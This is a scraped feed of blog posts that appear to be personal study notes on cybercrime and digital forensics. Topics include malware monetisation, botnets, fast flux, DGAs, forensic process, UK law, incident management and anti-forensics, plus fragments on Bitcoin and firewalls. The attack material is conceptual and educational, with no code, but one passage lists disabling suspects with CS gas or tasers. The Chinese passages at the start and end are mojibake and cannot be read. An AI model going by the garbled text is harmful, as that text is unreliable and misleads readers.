éš¾åº¦ï¼Œä½†æ˜¯éªŒè¯èµ·æ¥å´ååˆ†å®¹æ˜“ åŒæ—¶é™¤äº†éªŒè¯pool of unverified transactions ä¹‹å¤–ï¼Œè¿˜éœ€è¦éªŒè¯ä»¥å‰çš„transactions ï¼Œä¹Ÿå°±æ˜¯è¯´è®¡ç®—é‡ä¼šè¶Šæ¥è¶Šå¤§ï¼Œä¹‹å‰çš„transaction ä¹Ÿä¼šå˜å¾—è¶Šæ¥è¶Šå¯é ï¼Œä¸€èˆ¬è®¤ä¸ºå­˜åœ¨äº6ä¸ªblocksçš„ transactionå°±å·²ç»æ˜¯ä¸å¯é€†çš„äº† ","date":"2022-05-11T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/mb2_chapter_2/","title":"Mastering Bitcoin 2nd Edition Chapter 2: How Bitcoin Works"},{"content":"CFC Week 3: Malware uses and monetisation Learning outcomes  Explain the different monetisation strategies.  Discuss the other ways malware is used, apart from monetisation.  Explain how cybercrime is a commodity and how it is supported by an underground economy.   What is the information-stealing malware? Information-stealing malware monitors its victims to collect usernames, passwords and financial information What is two-factor authentication?  what you know (password)  what you have (mobile phone for code)  what you are (fingerprint, face, retina)   What is man-in-the-browser attack? Man-in-the-browser attacks changes the browser window and makes users think that they are performing a legitimate transaction when they are sending money to the attacker instead. Describe operations of a mobile banking trojans  What is Ransomware Cybercriminals encrypt user\u0026rsquo;s files and ask for a ransom to decrypt them again What is fake antivirus?  lure user to pay the money and download fake antivirus.  The fake antivirus doesn\u0026rsquo;t to anything, but perform malicious activities itself   What is pay-per-installs scheme rent botnets for other cybercriminals for installing malware What is DDoS as a service  Types   use servers: higher bandwidth use infected computers: cheaper  Services   damage their competitor stress-testing services Mining bitcoin use infected computers to mine bitcoin, set up botnets Ways of using malware to make money  Man-in-the-browser attacks  Financial malware  Ransomware  Fake anti-virus  DDoS as a service  Mining bitcoin   How underground communities avoid lemon market?  self-policing  scrutinise newly listed products and services  interview people who want to join  require recommendations from joined members to join    escrow system  payments first made to the administrator  forwarded to seller after authenticity has been confirmed     How cybercrime supported by an underground economy?   CAPTCHA-solving service : automated software solver or human manually solve the CAPTCHAs   Phone vertification abuse : - use Voice over IP (VoIP) numbers   purchase SIM cards in developing countries (cheap)   use SMS-vertification as a service     Fake social media accounts : - automatically create accounts and followers   Proxy : is a server that relays connections for a host, which hide the location and circumvent censorship   Exploit kits : automate the exploitation of vulnerabilities   Payment : - find banks willing to process criminal payment (high transaction fees)  use cryptocurrency     ","date":"2022-05-09T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/cfc_week_3_malware_uses_and_monetisation/","title":"CFC Week 3: Malware uses and monetisation"},{"content":"CFC Week 2: Advanced malware and worldwide SPAM Learning outcomes  Describe how users get infected with malware.  Describe how malware hides and how botnets function.  Discuss the different ways criminals use malware.   What is Infection vector? The method malware uses to propagate itself or infect a system or device List methods users get infected   Social engineering : - Users are made to believe that they are installing a useful program instead of a malicious one  Common vehicles are:   Email attachments   Software updates   Scareware       Drive-by-download : - A vulnerability on the user\u0026rsquo;s computer is exploited to have the computer automatically download and install malicious software  Common processes:   The user click on a link and is redirected to a malicious site   Malware is downloaded to the user\u0026rsquo;s computer   By exploiting a vulnerability, malware is executed and spread without the user\u0026rsquo;s interaction       How mebroot malware works?  Install in the Master Boot record, where executed before the operating system is loaded  then the malware modifies the operating system when it is loaded, disable the antivirus   What are differences between instruction reordering and instruction substitution?   Instruction reordering : - the order of the instructions is changed  output is the same  signature is different     Instruction substitution : - different instructions are used with produce the same result   How modern antivirus software works against instruction reordering/substitution? looks for behaviours that are typical of malicious code What is polymorphic malware malware itself comes encrypted, each infection file looks different How malware authors prevent analysis in the first place? Malware developers try to detect whether their malware is being analysed and stop execution How botnets works?  A number of computers compromised by an attacker  bots connect to a botmaster to receive commands   What is fast flux? Host C\u0026amp;C servers in static domain names, but frequently change the IP addresses behind What does domain generation algorithm(DGA) do? constantly change the domain names of C\u0026amp;C servers, DGA is used to map domain names to C\u0026amp;C servers What is remote access tools(RATs)  usually used in commodity malware  RAT operator interacts with the victim\u0026rsquo;s machine via a GUI    capture audio and video from device  logging keyboard inputs  browse files on machine     Three main challenges of criminals evolving in an arms race?  Modern malware does not need user interaction to install  Malware uses advanced techniques to avoid detection  Botnets are constantly evolving their communication model to become more resilient   Ways of monetising botnets include:  Send email spam  Post malicious content on social networks  Perform advertisement fraud  Encrypt victim data and ask for ransom  Steal the victim\u0026rsquo;s financial information   Differences between legitimate and malicious affiliate programmes  they deal with products that are illegal  they endorse criminal promotion techniques(botnets, black-hat SEO)   What is blackhat search engine optimisation(SEO), and how it works? To attract victims, malicious websites are pushed high in search engine ranking for keywords that are unrelated to the website  Find popular trends on Google  Generate content related to the trends and link to the malicious site  Upload the content on a forum, or on a compromised websites   What are two tiers in spam operations  Front-end Deals with sending spam emails:  Email harvesters  Botmasters  Spammers    Back-end Deals with converting spam traffic into money:  affiliate programmes     Actors in underground economy  Botmasters infect computers, create botnets, and rent them  Harvesters crawl the internet looking for valid email addresses  Search engine optimisation(SEO) experts make sure that malicious sites are highly ranked on search engines  Spam affiliate programs Set up sites selling goods - spammers can sign up to these programs and receive their cut   ","date":"2022-05-07T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/cfc_week_2_advanced_malware_and_worldwide_spam_economy/","title":"CFC Week 2: Advanced malware and worldwide SPAM"},{"content":"CFC Week 4: Cybercrime mitigations Learning outcomes  List and describe the various mitigation strategies.  Understand that there is a constant arms race between criminals and investigators.   List four mitigation strategies  Engineering Securing computers and networks crippling botnet operations.  Law Effectively prosecuting malware authors and their associates.  Economics Making sure that cybercriminals don\u0026rsquo;t make money.  Education Increasing user awareness of cybercrime threats.   Two types of Intrusion detection system (IDS)  Misuse-based IDS rely on models of malicious behaviour to identify matching entries in the event stream  Anomaly-based IDS rely on models of normal behaviour to identify anomalous entries in the event stream   List engineering mitigations techniques  antivirus software  intrusion detection  patch vulnerabilities  Blacklist  mitigate blackhat search engine optimisation  DNS sinkholing (ISPs can avoid directing their clients to domains that are known to be malicious)  Dynamically allocating the resources (against DDoS)   How to take down a botnet?  seize active C\u0026amp;C servers (law enforcement/ ISPs)  mitigate existing infections (DNS sinkholing)  clean up infected computers (redirect the user and teach them how to)   How to improve user awareness for reducing the rate of malware infections Educations on:  Social engineering, how to avoid installing scareware  Software updates, how to keep systems up to date to avoid driven-by download attacks  Scams, how not to be money mule or reshipping mule scams   Why arrest criminals is more effective   Attackers could always set up a new operation   Botnet is easy to set up   Attackers learn from the takedown and make the operation more resilient   Two reasons for taking down C\u0026amp;C servers:  Because the act of misusing computers through malware is illegal  Because the operations that the botnet carried out are illegal   List economics mitigation strategies  Raise domain cost to curb misuse  ISPs need to keep good relations with each other  Banks need to keep good relationships with other financial institutions which force rogue banks to stop doing business with cybercriminals   ","date":"2022-05-07T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/cfc_week_4_cybercrime_mitigations/","title":"CFC Week 4: Cybercrime mitigations"},{"content":"CFC Week 5: Legal Framework Learning outcomes  Briefly describe the legal aspects of cybersecurity.  Summarise the main pieces of computer misuse legislation.  Identify the different pieces of legislation governing intellectual property, copyright and data protection.  Identify the three ACPO principles and explain their implications for computer forensics.   11. Describe the three main sections of the UK Computer Misuse Act 1990, as modified by the Police and Justice Act 2006.   unauthorised access to computer material, punishable by 24 months\u0026rsquo; imprisonment and/or an unlimited fine  updated (2006): punishable by up to 2 years in prison or a fine or both     unauthorised access with intent to commit or facilitate commission of further offence(s), punishable by 24 monthsâ€™ imprisonment and/or an unlimited fine on summary conviction and/or 5 years imprisonment and/or an unlimited fine on indictment;   unauthorised modification of computer material, punishable by 24 monthsâ€™ imprisonment and/or an unlimited fine on summary conviction and/or 10 years imprisonment and/or an unlimited fine on indictment;  updated (2006) by unauthorised acts with intent to impair operation of computer, etc.  punishable by up to 10 years in prison or a fine or both to cover Denial of Service (DoS) attacks.       12. Describe the main provisions of the Investigatory Powers Act 2017 and explain how the Act can benefit certain digital forensic investigations.  Provides for UK intelligence agencies and UK law enforcement to carry out targeted interception of communications, bulk collection of communications data, and bulk interception of communications;  permits access to CSP(communication service providers) and ISP(Internet Service Provider) logs, and right to demand decryption keys to encrypted data.   How would law enforcement go about prosecuting terrorism in the UK and outside of the UK? Apply Mutual Legal Assistance Treaties applicable for specific country Two tiers of administrative fines that can be levied as penalties for non-compliance in General Data Protection Regulations (2018)  Up to â‚¬10 million, or 2 per cent annual global turnover â€“ whichever is higher.  Up to â‚¬20 million, or 4 per cent annual global turnover â€“ whichever is higher.   What type of data and individual\u0026rsquo;s fundamental rights are protected under the GDPR(General Data Protection Regulation)?  Type   Data minimisation: only collect and use what is needed for the processing activity being undertaken  Rights  Retention: keep it only for as long as required  Accountability: record keeping of data processing  Security: protect data against breaches or unlawful processing of personal data  Purpose limitation â€“ data can only be used for the purpose it was collected for   10. Describe the four UK ACPO(Association of Chief Police Officers) principles on handling digital evidence, explaining the rationale underlying them.  No action taken by law enforcement agencies or their agents should change data held on a computer or storage media which may subsequently be relied upon in court.  In circumstances where a person finds it necessary to access original data held on a computer or on storage media, that person must be competent to do so and be able to give evidence explaining the relevance and the implications of their actions.  An audit trail or other record of all processes applied to computer-based electronic evidence should be created and preserved. An independent third party should be able to examine those processes and achieve the same result.  The person in charge of the investigation (the case officer) has overall responsibility for ensuring that the law and these principles are adhered to.   Proportionality issues relating to seizure  Does the item may hold evidence?  Where the item is found?  When the offfence was committed?  Seize the items current in usage first.  Every seizure of item should be reasonable  Follow the Human Rights   What should be prepared before attending a scene to capture digital evidence?  Necessary equipment  Consider potential sources of evidence: what, where?  Consider seize cameras for taking digital photographs when evidence involve user-created digital images  Take force\u0026rsquo;s speciallist advice in advance   What should do when attending a scene?  All actions should be recorded  Avoid unwanted changes, be aware of volatile data, accessed by trained personnel, e.g. powered on/running systems   Capturing online evidence  Online evidence  publicly available (e.g. forum postins, do not need to login), be aware of potential issues.  private (login required)  make records of all actions     What could be included in source data  Internet history records;  E-mails;  Instan Messaging logs;  Media files (images and videos);  Text Messages;  Text documents;  Spreadsheets;  CCTV   ","date":"2022-05-06T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/cfc_week_5_legal_framework/","title":"CFC Week 5: Legal Framework"},{"content":"CFC Week 9: Incident Management Learning outcomes  Explain the Incident Management process.  List the elements of the logging process.  Describe the life cycle of events.   What is the incident? is an unexpected event that disrupts the normal operation of a system What is the objective of the incident management process? is to return the service to normal operation as quickly as possbile after disruption What is the aim of incident management process? create as little negative impact as possbile on the business What are two modes of operations in incident management process?   In practice : find a temporal workaround to ensure services are up and running   In parallel : - investigate the incident  identify the cause root  find a permanent fix     What are frameworks used to tackle incidents?  ITIL  Information technology infrastructure library  uses a workflow for efficient resolution     What are incident management workflow?   Incident management  Logging   Streamlined processes  Categorisation  Prioritisation  Response   Follow corporations\u0026rsquo; guidelines   Diagnosis   Escalation   Resolution and recovery   closure   What is Incident identification in incident management workflow? Incidents are generally reported when attacks or incidents have been identified  Unreported incidents False negative, pose a systematic risk to the organisation  Mistakenly reported incidents False positives, when the system begin to report anomalous behaviours?   Where does incident identification start with? It start with identify through the automated/manual analysis of digital artefacts and logs What is logging process in incident management workflow?  Logging is the process in which systems and applications inform about \u0026ldquo;what they do.\u0026rdquo;  Useful to administrators to check when something goes wrong   Does incident management workflow always start with analysis of digital artefacts and logs? Incidents are often discovered by the user of the system  they notice that something is abnormal  they simply see evidence of an attack   What are the most important elements of the logging process? The most important one is the event.  Event a single occurrence within an environment  consists of event fields and event records  event fields describe characteristic of the event  event records describe a collection of event fields     What is Log in logging process?  Log a collection of event records  data logs  log files     What is Audit in logging process?  Audit process of evaluating logs   What is Recording in logging process?  Recording Process of tracking event fields (\u0026ldquo;I am going to track an IP address\u0026rdquo;)   What is Logging in logging process  Logging is the process of saving events into logs   What is Security incident in logging process  Security incident is the occurrence of a security event (intrusion attempt or data leakage)   What is the lifecycle of events?   turn information from unstructured logs with low-level descriptions of the characteristics of events   into a high-level representation of actionable events, namely alarms   The first funnel filters    decentralised logs into centralised logs     then turn into normalised logs     then into the second funnel       The second funnel produces alarms through  log filtering  aggregation,  correlation  finally trigger the alarms     Final alarms supported by  false alarm reduction  attack strategy analysis  prioritisation       What are Alarms?  Alarms  are meant to be reported to humans  alarms help security operator analyse the strategy of an attack and prioritise responses.   Intrusion detection system should be configured in such a way that false alarms are minimised   What is normalisation of logs? is the procedure in which  all logs that are processed by an intrusion detection system  are processed and stored in a common format  and all relevant attributes of the event are identified and processed   What is event correlation? Event correlation brings a higher level of intelligence to the process It teaches the system to consider various conditions before trigger the alarm What is the Security information management (SIM)? The practice of collecting, monitoring and analysing security-related data from computer logs. What is the Security information management system (SIMS)?  It automates the collection of event log data from security devices  It translates the logged data into correlated and simplified formats  It has strong log management capabilities (compress logs for storing over long periods of time)   What is the Security event management (SEM) systems? It provides strong:  event management  real time threat analysis  visualisation  ticketing  incident response  and security operations   Based on enterprise SQL databases Not ideal for log management and long-term storage of excessive amounts of logs (poor at log compression) What is the (OSSIM)? How Open Source Security Information Management (OSSIM) evaluates the risks? Risk = (Asset * Priority * Reliability) /25  Asset  is the quantitative measure of the importance  and/or a notion of how vulnerable a given asset is    Priority is the threat or impact of the attack  Reliability is the probability that a given set of events will actually be an attack    Asset - 0 - 5  Priority - 0 - 5  Reliability - 0 - 10    0 - 2 = Low  3 - 4 = Medium  5 - 6 = Medium-high  7 - 8 = High  9 - 10 = Very high   How forensics cooperate with SIEM? forensic investigator would collect the evidence from the source, the native logs. What is the Sensing strategies? It defines how the SIEM is deployed. It details:   Where to place the different sensors   how these sensors are interconnected   what the security measures are   who the people in charge of each sensor are    collectors,  normalisers  aggregators  Intrusion Detection Systems and correlation and report engines      ","date":"2022-05-04T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/cfc_week_9_incident_management/","title":"CFC Week 9: Incident Management"},{"content":"CFC Week 7: Memory and network forensics Learning outcomes  Define the fundamental aspects of computer and network forensics.  Describe the data collection processes through the different abstraction layers.  List the kind of evidence that can be obtained from volatile memory and non-persistent network data.   Device forensics target the OS and the data structures present in the system What are primary sources of evidence in device forensics? are storage devices:  Hard disk drives (HDDs)  Solid state drives (SSDs)  External media (USB sticks)   How to understand the data stored on devices? Use Data abstraction layers:   Physical media : - lowest level examinations  Access through host bus adapter (HBA) interface  which implement low-level operations: SATA and SCSI     Block devices : block device is an abstract device of fixed size block use term sector as unites for magnetic hard disks Data acquisition at the block level is done through imaging   File system : aims to organise the block storage into a file-based store provide files with attributes (name, size, owner, timestamps, access permissions, etc.)   Application artefacts : where we find executable binaries, libraries, configuration and log files and registry entries   What is the physical data acquisition in device forensics? is the process of obtaining data directly from hardware media, without the mediation of any potentially untrusted third-party software we also use logical data acquisitions which relies on one or more software layers as intermediaries Characteristics of SSDs SSDs use semiconductors to store data two memory areas:  one area is used to save data  one area is used as a cache   SSD blocks need to be written twice in order to be reused:  First write to reset the state  Second write to store the data   File content carving aims to recover the data by reassembling file contents from fragments why this works? Most file formats have specific beginning and end tags Four types of file content, require different carving approaches:    Contiguous : The header of file A is followed by the contents of file A and ends with a footer of that file   Nested : The header of file A is followed by a part of that file\u0026rsquo;s content, then the header of file B is present followed by the content and footer of that file. A finished after B.   Bifragmented : The Header and some part of file A followed by some unrealted data then followed by remains The recovery of this file will depend on how easily the unrealted data is recognised   Interleaved : The content of file A is mixed with File B, A finished before B   Why we are interested in doing Memory forensics? Data can persist for quite a long time in volatile memory Volatile memory can contain useful information which hard disk does not (en/decryption key) How to perform offline memory forensics Freeze the RAM of a computer What a forensic analyst must know about memory forensics?  What are the things that might change across time?  What are the things that will not?  How presenting evidence from memory can impact your investigation   What are the challenges behind live forensics?  In live forensics, we\u0026rsquo;re unsure whether evidence will be accepted or not.  Extract evidence from memory is not easy and takes long time   What does generally change?  Process information identifying correlated user actions and file system activities, potentially demonstrating their intent  Running processes  Threads and loaded systems modules  Copy of the individual processes\u0026rsquo; code, stack, heap, code and data segments    Artefacts and fragments Caching disk and network data tends to leave traces in memory for a long time  File information  open files  shared libraries  shared memory  anonymously mapped memory    Network connections  closed network connections  protocol information  sending and receiving queues of data not yet send or delivered     Network forensics monitor and analyse the computer network traffic for information gathering, legal evidence or intrusion detection Why is the difference between network forensics with other digital forensics   network investigations focus on volatile and dynamic information   because network traffic is transmitted and then lost   Thus the data would be actively collected   What are two common scenarios in network forensics?  Security  monitor a network for anomalous traffic and identify intrusion.  when attacker has erased all log files on a compromised host    Law enforcement  reassemble transferred files  search for keywords  parse human communication     What are two strategies in network forensics?  \u0026ldquo;catch-it-as-you-can\u0026rdquo;  all packets are captured and written to storage for analysis  require large amounts of storage    \u0026ldquo;stop, look, listen\u0026rdquo;  each packet is analysed in a rudimentary way in memory  only certain meta information is saved  require more processing capabilities     What method we apply to network forensics on ethernet layer? Use sniffer to eavedrop the beta stream: Wireshark and tcpdump Wireless forensics collect and analyse wireless network traffic that can correspond to plain data or with a broad usage of. ","date":"2022-05-03T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/cfc_week_7_memory_and_network_forensics/","title":"CFC Week 7: Memory and network forensics"},{"content":"CFC Week 8: Anti-forensics Learning outcomes  Describe the most relevant anti-forensic techniques.  Explain the challenges behind handling encrypted devices.   What is Anti-forensics\u0026rsquo; goal? It aims to evade and thwart the forensic process through the implementation of attacks and adoption of adversarial actions. What are four most adversarial actions adoptted in Anti-forensics   Destroy : destroy potentially useful digital forensic evidence of their activities (like wiping log files)   Divert by : Plant misleading digital forensic evidence  spoofing the source IP address of a cyber attack     Deceive by : hide potentially useful digital forensic evidence, use  steganography  onion-routing     Deny : Deny the access of potentially useful digital forensic evidence  use cryptography and conceal the evidence     What is meant by Full disk encryption? Secure the disk and other volumes with strong encryption key (2048 bits by TrueCrypt) How may a digital forensic examiner attempt to overcome FDE (full disk encryption) in a reasonably short time?  In order to operate full disk encryption, the decryption key must be stored in main memory or in a separate device.  Use live forensic techniques to retrieve the decryption key to decrypt the disks.    FDE is not in operation:  key might stored in a TPM (trusted platform module), a hidden partition or a dongle  use cold boot attack which freeze the RAM to get stored encryption keys     How to make a sound forensic analysis (soundness)?  Acquisition of data should change the regional evidence as little as possible  changes needed to be explained and documented    Documentation  where the evidence originated?  how it was handled?     When credentials for decrpyting are not available, what we can do with Full-disk encryption system?  Attempt decryption  brute force attack  dictionary attack    Load duplicate into a virtual environment  decrypted later in a number of ways    Restore to a working hard disk  Boot a restored clone of the original disk   How to avoid an online suspect who is also technically sophisticated to tamper or erase the digital evidence?  Distraction  Hoax parcel delivery  Meter reader  kiss-o-gram    Disablement  disconnect electrical power supply  pipe CS gas  use a taser     Reverse engineering aims to understand both:  how malware technically behaves and  how opaque system function prior to a forensic investigation   ","date":"2022-05-03T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/cfc_week_8_anti_forensics/","title":"CFC Week 8: Anti-forensics"},{"content":"CFC Week 6: The forensics process Before the forensics Why we said that computer information is a double-edged sword in forensic? One the one hand, this information can provide compelling evidence in an investigation One the other hand, it also introduce complexity that can trouble experienced practitioners 8. How does digital forensics differ in practice from conventional forensics?   Conventional forensics\nConventional forensics is based on Locard's Exchange Principle Locard\u0026rsquo;s Exchange Principle : Every contact leaves a trace. Physical contact leaves exchange of physical material. Conventional forensics also called wet forensics : Human body sweats, fingers are greasy -\u0026gt; touch and walk leave fingerprints and footprints   Why we need to isolate the crime scene, and How? To save a great number of logs which provide actions and interactions and avoid:  Cover digital tracks  and commit the perfect cybercrime   What are the paramount challenges of crime scene isolation? More and more devices are hyper-connected Why the crime scene need to be frozen, and How? Services are connected to network or Internet, to define the crime scene, we have to freeze the scene and control the range. freeze the memory RAM of a device,and also cut the network (Faraday cage to cancel wireless signal) Define digital forensics process A set of methods driven towards the acquisition of legal evidence, which is possible for presentation in a court of law. i. Acquisition process \u0026ldquo;Going there and getting the stuff\u0026rdquo;  Judges have reasonable suspicion  A warrant indicates what type of devices that a forensic can seize (which corresponding to suspicions due to principle of proportionality  The place of a device is found is important to determine whether it\u0026rsquo;s relevant or not (like the one hidden in secret compartment of a drawer, even the type of mobile phone is not on the list)  Careful documentation of the acquisition process:  take photographs  tag all the bags with all details  watch out for hidden devices in plain sight     ii. Preservation   Provenance and change of custody are paramount (based on ACPO principles)   Making bit-for-bit images of all seized media   Use Write-blocker to make all drive devices read-only   Use cryptographic hashes to verify the integrity of the files (MD5 of SHA2)   In traditional forensics, you can destroy part of the evidence once you done with interventions like DNA testing the sample used in testing could be destroyed after the test However in computer forensics, 2,3 are required for the future   iii. Searching aims to reduce the data volume to a manageable and reviewable level, but it has potential to impact the completeness and accuracy of an investigation  Search Method   Keyword-searching (not works on encoded or encrypted files, there are other tools) Other tools for special files(compressed, encoded, encrypted or password protected files)   What if you find a evidence of another crime?\n Start an independent process with warrant  Not allowed to collect evidence for that crime     iv. Analysis of evidence aims explain what does the evidence signify?  correlate evidence to your hypothesis  explain their timeline  identify what has happened   v. Evaluation of evidence aims to confront the evidence  Assess how strong that evidence is  Challenge your own hypothesis using the evidence  Be able to know how compelling evidence is   vi. Reporting aims to inform how the forensic analysis has reached a conclusion It should be done in a form and style that lets both:  Technical experts validate their findings  Legal personnel and juries can understand it   Put layman's terms what the evidence means on executive summary would help Characteristics of Legal Evidence (in UK) Admissibility Evidence has to be first-hand information, original and not hearsay. Authenticity Evidence should be genuine with clearly authentication to authenticate what it claims to be. The correctness would be determined by court and judge later based on the evidence (we just try to use evidence to tell the hypothesis and evidence are correct) Accuracy Evidence should provide precise, clear and not vague information Completeness Evidence should be self-contained and not partial Probative value Evidence should be probative, if evidence\u0026rsquo;s danger outweight the value, the court can exclude it  Danger of evidence  introduce an unfair prejudice  confuse the issues  mislead the jury  introduce undue delay or waste time, or just simply present cumulative evidence     List and describe the key steps of the investigative methodology  Fundamental questions relating to a crime  Sequencing (when things happend?)  Linkage (who interacted with whom?)  Evaluation of source (the origin of items)  Attribution (who is responsible?)     What is the scientific method? Scientific method is a cyclic process, aims to repeat the steps to get the conclusion   Gather information and make observations : aims to provide all evidence which you have access to  Process legal evidence: 1. Acquire 2. Preserve 3. Search 4. Verify integrity 5. Authentication  Process digital evidence: 1. preprocess 2. salvage deleted data 3. handle special files 4. filter out irrelevant data 5. extract embedded metadata     Form a hypothesis to explain observations : Develop possible explanations   Evaluate the hypothesis : Aims to suppress biases and hunches and try to disprove current working hypothesis through experiment Avoid confirmation bias: - do not skew our thinking and analysis in favour of the working hypothesis     Draw conclusions and communicate findings : Communicate the explanations which supported by evidence with decision makers    Understand the capabilities of the tools  Understand the capabilities of the tools  Use multiple tools when possible     List the functions of forensic analysis   Attribution of activities : aims to attribute computer activities to a particular person To avoid a person to deny the responsibilities for the illegal activities, we could use  personal communication  access to online banking or e-commerce accounts     Assessing alibis : use evidence from multiple sources   Determining intent : analyse:  internet search history  suspicious behaviours  notes and plans     Evaluating sources : reveal the source of the evidence, and where it is produced or altered. Compare the evidence with an exemplar can reveal useful information   Document authentication : - Look for nuances on date-time stamps   look for metadata within files   extract attributes buried within storage media     The e-discovery process What is the e-discovery process Exchange of data between parties in civil or criminal litigation The process is largely controlled by attorneys who determine what data should be produced based on relevance, or withheld based on claims of privilege Electronic Discovery Reference Model    Preservation  Ensuring that ESI is protected against inappropriate alteration or destruction.     Collection  Gathering ESI for further use in the e-discovery process (processing, review, etc).     Processing  Reducing the volume of ESI and converting it, if necessary, to forms more suitable for review and analysis.     Review  Evaluating ESI for relevance and privilege.     Analysis  Evaluating ESI for content and context, including key patterns, topics, people and discussion.     Production  Delivering ESI to others in appropriate forms and using appropriate delivery mechanisms.     Presentation  Displaying ESI before audiences (at depositions, hearings, trials, etc), to elicit further information, validate existing facts or positions, or persuade an audience.   ","date":"2022-05-02T00:00:00Z","permalink":"https://ginkgo.org.cn/posts/cfc_week_6_the_forensics_process/","title":"CFC Week 6: The forensics process"},{"content":"NSE Week5: Firwalls How to protect edges of the Internet or Internal network? Local area networks (LANs), personal area networks (PANs), wireless local area networks (WLANs), ä»¥åŠ wireless sensor networks (WSNs) éƒ½å±äºInternetçš„æœ€è¾¹ç¼˜ï¼Œå¤§å¤šéƒ½æ˜¯ä¸ªäººç»„ç»‡æˆ–è€…å®¶åº­æ‰€æ‹¥æœ‰çš„å†…éƒ¨ç½‘ç»œï¼Œæˆ‘ä»¬å¯ä»¥æŠŠä¿æŠ¤è¿™æ ·çš„äº’è”ç½‘è¾¹ç¼˜ç½‘ç»œæˆ–è€…å†…éƒ¨ç½‘ç»œæ¯”å–»æˆä¿å«ä¸€åº§åŸå¸‚ï¼Œé€šè¿‡ä¸‰å±‚çš„ä¿æŠ¤æªæ–½æ¥é˜²æ­¢å…¥ä¾µ:  Perimeter Security (è¾¹ç•Œå®‰å…¨): é€šè¿‡å‡å°‘å…¥å£æ¥æ§åˆ¶è¿›å‡ºï¼Œæ´¾é£æ­¦è£…å®ˆå«æŠŠå®ˆï¼ŒåŒæ—¶è¦æ±‚è¿›å‡ºçš„äººå‘˜æ‹¥æœ‰é¢„å…ˆè®¾å®šçš„è¯æ˜  Street patrolling (è¡—é“å·¡é€»): æ´¾é£æ­¦è£…å®ˆå«å®šæœŸä¸Šè¡—å·¡é€»ï¼Œæ¥è¯†åˆ«å…¥ä¾µè€…  House cleaning (å…¥å®¤æ’æŸ¥): æ´¾é£ä¸“ä¸šçš„å®‰å…¨ä¸“å®¶æŒ¨å®¶æŒ¨æˆ·çš„æ’æŸ¥å¤–æ¥å±é™©å“ä»¥åŠå®‰å…¨æ¼æ´   è¿™ä¸‰é“å¯¹äºåŸé‚¦çš„åŒ…å›´ä¹Ÿå°±å¯ä»¥å¯¹åº”ç½‘ç»œå®‰å…¨ä¸­çš„ä¸‰é¡¹æŠ€æœ¯ï¼š  Perimeter Security \u0026lt;-\u0026gt; Firewall: é˜²ç«å¢™  Street patrolling \u0026lt;-\u0026gt; Intrusion detection systems: å…¥ä¾µæ£€æµ‹  House cleaning \u0026lt;-\u0026gt; Anti-malicious-software: æ€æ¯’è½¯ä»¶   è€Œæˆ‘ä»¬ä»Šå¤©è¦è®²çš„ï¼Œå°±æ˜¯å†…ç½‘çš„ç¬¬ä¸€é“é˜²çº¿ï¼Œé˜²ç«å¢™ã€‚ åœ¨æ­£å¼ä»‹ç»é˜²ç«å¢™ä¹‹å‰ï¼Œæˆ‘ä»¬æœ€åå†ä»‹ç»ä¸€ä¸‹é’ˆå¯¹è¾¹ç•Œæ”»å‡»çš„é˜²å¾¡ç†å¿µï¼š5Ds of Perimeter Security: Deter -\u0026gt; Detect -\u0026gt; Deny -\u0026gt; Delay -\u0026gt; Defend   Deter : - ç»„ç»‡å…¥ä¾µçš„å‘ç”Ÿï¼ˆåœ¨å…¶å‘ç”Ÿä¹‹å‰è¿›è¡Œç»„ç»‡ï¼‰ï¼Œå³ä½¿ç”¨ fencing å›´æ , lighting å®Œå…¨ç…§æ˜, signs å‡ºå…¥ç­¾å ç­‰æ–¹å¼å¯¹çŠ¯ç½ªè€…è¿›è¡Œè¢«åŠ¨å¨æ…‘ï¼Œä»æœ€å¼€å§‹å°±æ‰¼æ€å…¥ä¾µçš„å¿µå¤´  ä½¿æ”»å‡»å˜å¾—å›°éš¾ï¼Œè®©attackerä¸»åŠ¨æ”¾å¼ƒ     Detect : - æ£€æµ‹å…¥ä¾µçš„è¡Œä¸ºï¼Œä¾‹å¦‚ CCTV ç›‘æ§, ç”¨æ¥ç›‘æ§å’Œè®°å½•æ‰€æœ‰çš„å…¥ä¾µè¡Œä¸º  Intrusion detection software  Traffic analysis and machine learning to detect abnormities     Deny : - æ‹’ç»æœªç»æˆæƒçš„è®¿é—®ï¼Œé€šè¿‡ä¸€äº›è®¤è¯ç³»ç»Ÿæ¥ä¸»åŠ¨æ‹’ç»å…¥ä¾µçš„è¡Œä¸ºï¼Œå…¶ä¸­é˜²ç«å¢™å°±å±äº Deny  Authentication, authorisation, freshness     Delay : - å»¶ç¼“å…¥ä¾µçš„é€Ÿåº¦ï¼Œé€šè¿‡è®¾ç½®éšœç¢æ¥å»¶é•¿å…¥ä¾µçš„æ—¶é—´ï¼Œè¿«ä½¿å…¥ä¾µè€…æ”¾å¼ƒæˆ–è€…ç»™äºˆå®‰å…¨å›¢é˜Ÿæ›´å¤šçš„æ—¶é—´  å¢åŠ å¯†é’¥çš„é•¿åº¦     Defend : - ä¸»åŠ¨åœ°å¯¹å…¥ä¾µè€…è¿›è¡Œæ‰“å‡»ï¼Œé€šè¿‡å®‰å…¨å›¢é˜Ÿæˆ–è€…è­¦æ–¹çš„è¡ŒåŠ¨æ¥ç»„ç»‡å…¥ä¾µ   What is a firewall? ä»€ä¹ˆæ˜¯é˜²ç«å¢™ï¼Œå®ƒæœ‰ä»€ä¹ˆä½œç”¨å‘¢ï¼Ÿ é˜²ç«å¢™æ˜¯ä¸€å°ä¸»æœºæˆ–è€…ä¸€ä¸ªç½‘ç»œæœåŠ¡ï¼Œæ¶è®¾äº å†…ç½‘ å’Œ å¤–éƒ¨ç½‘ç»œ ä¹‹é—´ï¼Œç”¨æ¥ï¼š  é˜²æ­¢åäº‹å‘ç”Ÿ (å†…éƒ¨æ³„éœ²æœºå¯†åˆ°å¤–éƒ¨ï¼Œå¤–éƒ¨æ”»å‡»å†…éƒ¨ç³»ç»Ÿ)  åŒæ—¶ä½¿æ­£å¸¸çš„è¡Œä¸ºä¸æ”¶åˆ°å½±å“(å‘˜å·¥æ­£å¸¸è®¿é—®å¤–ç½‘äº¤äº’)    é˜²ç«å¢™çš„ä¸»è¦åŠŸèƒ½ ä¸»è¦å·¥ä½œï¼šAccess control è®¿é—®æ§åˆ¶  